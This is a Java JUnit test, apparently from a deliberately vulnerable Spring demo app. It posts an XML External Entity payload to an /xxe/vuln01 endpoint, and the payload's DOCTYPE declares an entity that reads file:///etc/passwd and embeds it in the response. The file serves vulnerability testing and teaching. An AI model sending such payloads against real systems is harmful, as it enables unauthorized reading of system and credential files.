package com.cinderella.demo;

import com.cinderella.demo.controller.XXE;
import org.junit.Before;
import org.junit.Test;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.RequestBuilder;
import org.springframework.test.web.servlet.result.MockMvcResultHandlers;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * @author Cinderella
 * @time 2021/8/24 16:23
 * @Description
 **/
public class XxePrint {
    private MockMvc mvc;

    RequestBuilder request;

    @Before
    public void setup(){
        mvc = MockMvcBuilders.standaloneSetup(new XXE()).build();
    }

    @Test
    public void dom4jtest() throws Exception{
        request = post("/xxe/vuln01").contentType(MediaType.APPLICATION_XML).content("<?xml version=\"1.0\"?>\n" +
                "<!DOCTYPE GVI [<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n" +
                "<catalog>\n" +
                "    <core id=\"test101\">\n" +
                "        <author>John, Doe</author>\n" +
                "        <title>I love XML</title>\n" +
                "        <category>Computers</category>\n" +
                "        <price>9.99</price>\n" +
                "        <date>2018-10-01</date>\n" +
                "        <description>&xxe;</description>\n" +
                "    </core>\n" +
                "</catalog>");
        mvc.perform(request).andExpect(status().isOk()).andDo(MockMvcResultHandlers.print());
    }
}
